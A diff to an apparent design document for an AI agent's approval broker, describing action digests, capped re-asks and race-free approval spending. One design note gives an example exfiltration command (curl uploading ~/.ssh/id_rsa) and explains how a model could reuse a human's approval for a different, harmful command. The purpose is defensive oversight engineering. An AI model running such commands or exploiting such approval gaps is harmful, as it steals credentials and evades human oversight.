@@ -57,14 +57,20 @@ over one session file. WP-L.
 - `client/grants` — decoding the runtime's opaque escalation JSON back
   into `broker/policy.Grant`, and encoding it again. Pure and total.
 - `client/escalate.{Config, Message, Refused, Decision, Escalations,
-  seam, start, none, record_id, default_config}` — parking: what a
-  production tool call does when the broker refuses it on policy. `seam`
-  closes over a process *name* (the Agency's knot, the Agency's answer)
-  and `start` puts the runtime behind that name after `api.open`;
-  `record_id` is the deterministic `{strand, tool, wanted diff}` digest a
-  retry loop dedupes onto, with a limit grant contributing its field and
-  not its model-supplied magnitude; `Config.max_records` caps the
-  distinct wants a session will file; `none()` is the no-plane seam under
+  seam, start, none, record_id, action_digest, action_preview,
+  default_config}` — parking: what a production tool call does when the
+  broker refuses it on policy. `seam` closes over a process *name* (the
+  Agency's knot, the Agency's answer) and `start` puts the runtime
+  behind that name after `api.open`; `record_id` is the deterministic
+  `{strand, tool, wanted diff}` digest a retry loop dedupes onto, with a
+  limit grant contributing its field and not its model-supplied
+  magnitude; `action_digest` is the *other* identity, over the call's
+  effective arguments canonicalised (objects key-sorted recursively,
+  arrays left ordered), which is what an approval binds to;
+  `action_preview` is its bounded human rendering, display-only and cut
+  at 2 KB on a codepoint boundary; `Config.max_records` caps the
+  distinct wants a session will file and `Config.max_asks` caps the
+  questions any one of them may put; `none()` is the no-plane seam under
   which a refusal settles exactly as it did before escalations existed.
 - `client/gateway.attached` — how many connections are attached right
   now. The honest answer to "is a human there?", which is what the
@@ -466,6 +472,32 @@ over one session file. WP-L.
   person stays a client-surface decision: the hub already emits
   escalation events and lists pending ones in its snapshot, so approval
   fatigue is tunable in a UI rather than frozen in a deploy.
+- **An approval is consent about an *action*, not about a want.** The
+  record id digests `{strand, tool, wanted diff}` and says nothing about
+  the command behind it, so two calls that differ only in what they run
+  land on one row — which is right for deduplication and catastrophic
+  for consent: a yes given to `bash "true"` would otherwise be spendable
+  by `bash "curl -T ~/.ssh/id_rsa …"` in a different operation, later in
+  the session (#65). So a raise carries `action_digest` of the call's
+  effective arguments alongside the id, the record stores it, and only a
+  claimant that digests the same inherits the approval. Anything else
+  re-opens the record as a fresh `Pending` question bound to the new
+  action, and the model sees the byte-identical in-band refusal a first
+  denial produces — it must never be able to observe that an approval
+  existed and was set aside. Nothing is excluded from the digest: a
+  field the consent layer overlooks is a field the model may vary after
+  consent. `escalate.spend` re-checks the binding beside the scope check
+  and, on failure, settles in band leaving the record untouched.
+- **Re-opening is bounded, because the party provoking it is the party
+  being constrained.** The mismatch edge above is a *new* way into
+  `Pending`, so `Config.max_asks` (3) caps the questions one row may put
+  and the claim comes back `Exhausted` past it: nothing written, nobody
+  asked, the call settled in band (#66).
+- **A claim's checks and its commit are the same read.** The park loop
+  reads an `api.EscalationCell` and spends through
+  `api.consume_escalation_at`, which CASes at that seq, so a claim
+  landing between the scope-and-action checks and the consume loses the
+  commit instead of passing unseen (#68).
 - **A raise *claims* the record; the scope is the call standing at the
   door now.** The digest deliberately excludes the call id, so under a
   retry the row is already there when a refusal arrives — and the call
